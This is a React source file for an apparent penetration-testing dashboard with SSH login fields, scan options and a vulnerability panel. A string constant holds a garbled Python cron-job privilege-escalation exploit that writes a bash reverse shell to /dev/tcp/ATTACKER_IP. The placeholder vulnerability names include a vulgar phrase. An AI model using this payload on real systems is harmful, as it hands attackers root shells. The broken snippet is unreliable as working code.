import { useState } from 'react'

import styles from './styles.module.css'
import classNames from 'classnames'

const details =
  '[*] Vulnerability Type: Insecure Cronn jobs\n\tDescription: Cron job allows attacker to launch /bin/sh as root\n\n[*] Vulnerability Type: Insecure file permissions\n\tDescription: Symlink to root process can be executed by non sudoer'

const code =
  '#!/usr/bin/python3\n\ncron_job_path = "/tmp/root_shell.sh"\n\npayload = """#!/bin/bash bash -i >&\n             /dev/tcp/ATTACKER_IP/ATTACKER_PORT \n             0>&1 """\n\n# Replace ATTACKER_IP and ATTACKER_PORT with your own IP and port attacker_ip = "192.168.1.100" \n# Change this to your attacker\'s IP attacker_port = "4444"  \n\n# Change this to the listening port on your machine# Create the payload with the attacker\'s IP and port \npayload = payload.replace("ATTACKER_IP", attacker_ip) \npayload = payload.replace("ATTACKER_PORT", attacker_port)  \n\n# Write the payload to the file that the cron job will execute\n\nwith open(cron_job_path, "w") as file: file.write(payload)  # Make the script executable\n\tos.chmod(cron_job_path, 0o755)  \nprint(f"[+] Exploit written to {cron_job_path}") print("[+] Waiting for the cron job to execute...")  '

const options = [
  "system_information", 
  "container" ,
  "cloud",
  "procs_crons_timers_srvcs_sockets", 
  "network_information", 
  "users_information", 
  "software_information",
  "interesting_perms_files",
  "interesting_files",
  "api_keys_regex"
]

const displayOptions = [
  "System Information",
  "Container",
  "Cloud",
  "Procs Crons Timers and Sockets",
  "Network Information",
  "Users Information",
  "Software Information",
  "File Permissions",
  "Interesting Files",
  "API Keys"
]

const examplesVulns = ["Teri Meri Prem Kahani", "Teri Ore", "Tera Mera Rishta", "O Re Piya", "Gaand me Danda De"]

export default function PentesterMode() {
  const [checkedItems, setCheckedItems] = useState(Array(10).fill(false));
  const [selectedVuln, setSelectedVuln] = useState(-1)

  const handleCheckboxChange = (index) => {
    const updatedItems = [...checkedItems];
    updatedItems[index] = !updatedItems[index];
    setCheckedItems(updatedItems);
  };

  return (
    <>
      <div className={styles.card}>
        <h2>Connection Panel</h2>
        <div>
          <input className={styles.connectionInput} name='username' placeholder='SSH Username' />
          <input className={styles.connectionInput} name='password' placeholder='SSH Password' />
          <input className={styles.connectionInput} name='port' placeholder='Port Number' />
        </div>
      </div>
      <div style={{ height: '1rem' }}></div>
      <div className={styles.card}>
        <h2>Select Scan Options</h2>
        <div>
          {checkedItems.map((isChecked, index) => (
            <div key={index} className={styles.checkboxContainer}>
              <input
                type="checkbox"
                id={`checkbox-${index}`}
                checked={isChecked}
                onChange={() => handleCheckboxChange(index)}
                className={styles.checkboxInput}
              />
              <label htmlFor={`checkbox-${index}`} className={styles.checkboxLabel}>{displayOptions[index]}</label>
            </div>
          ))}
          <button>Connect & Scan</button>
        </div>
      </div>
      <div style={{ height: '1rem' }}></div>
      <div className={styles.card}>
        <h2>Vulnerabilities</h2>
        <div>
          {examplesVulns.map((vuln, index) => (
            <div
              className={classNames(styles.vulnListItem, selectedVuln == index ? styles.selected : null)}
              onClick={() => setSelectedVuln(index)}
            >
              <p>
                {vuln}
              </p>
              {selectedVuln == index && (
                <>
                  <button>Exploit</button>
                  <button>Patch</button>
                </>
              )}
            </div>
          ))}
        </div>
      </div>
      <div style={{ height: '1rem' }}></div>
      <div className={styles.card}>
        <h2>Vulnerability Details</h2>
        <textarea readOnly={true} value={details}></textarea>
      </div>
    </>
  )
}
